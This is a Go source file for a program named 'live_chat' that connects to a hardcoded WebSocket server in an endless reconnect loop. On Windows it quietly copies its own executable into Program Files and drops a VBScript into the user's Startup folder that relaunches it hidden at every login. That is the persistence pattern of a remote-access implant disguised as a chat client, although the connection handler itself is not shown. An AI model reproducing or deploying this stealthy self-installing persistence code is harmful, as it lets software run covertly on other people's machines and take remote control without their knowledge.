package main

import (
	"io"
	"live_chat/src/constant"
	"live_chat/src/websocket"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

func main() {
	var wsURL string
	if len(os.Args) < 2 {
		wsURL = "ws://" + constant.IP_ADDR_SERVER + "/ws"
	} else {
		wsURL = os.Args[1]
	}

	if runtime.GOOS == "windows" {
		setupStartup()
	}

	for {
		websocket.ConnectToWebsocket(wsURL)
	}
}

func setupStartup() {
	exPath, err := os.Executable()
	if err != nil {
		log.Println("Erreur lors de la récupération du chemin de l'exécutable:", err)
		return
	}

	programFilesPath := os.Getenv("ProgramFiles")
	if programFilesPath == "" {
		log.Println("Variable d'environnement non trouvée.")
		return
	}

	destDir := filepath.Join(programFilesPath, "live_chat")
	destPath := filepath.Join(destDir, filepath.Base(exPath))

	if _, err := os.Stat(destPath); !os.IsNotExist(err) {
		log.Println("good")
	} else {
		if err := os.MkdirAll(destDir, 0755); err != nil {
			log.Println("Impossible de créer le répertoire de destination:", err)
			return
		}
		srcFile, err := os.Open(exPath)
		if err != nil {
			log.Println("Impossible d'ouvrir le fichier source:", err)
			return
		}
		defer srcFile.Close()

		destFile, err := os.Create(destPath)
		if err != nil {
			log.Println("Impossible de créer le fichier de destination:", err)
			return
		}
		defer destFile.Close()

		_, err = io.Copy(destFile, srcFile)
		if err != nil {
			log.Println("Erreur lors de la copie du fichier:", err)
			return
		}
	}

	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	vbsContent := `Set WshShell = WScript.CreateObject("WScript.Shell")` + "\n" +
		`WshShell.Run Chr(34) & "` + destPath + `" & Chr(34), 0` + "\n" +
		`Set WshShell = Nothing`

	vbsPath := filepath.Join(startupPath, "start_live_chat.vbs")
	err = os.WriteFile(vbsPath, []byte(vbsContent), 0644)
	if err != nil {
		log.Println("Impossible de créer le script de démarrage:", err)
	}
}
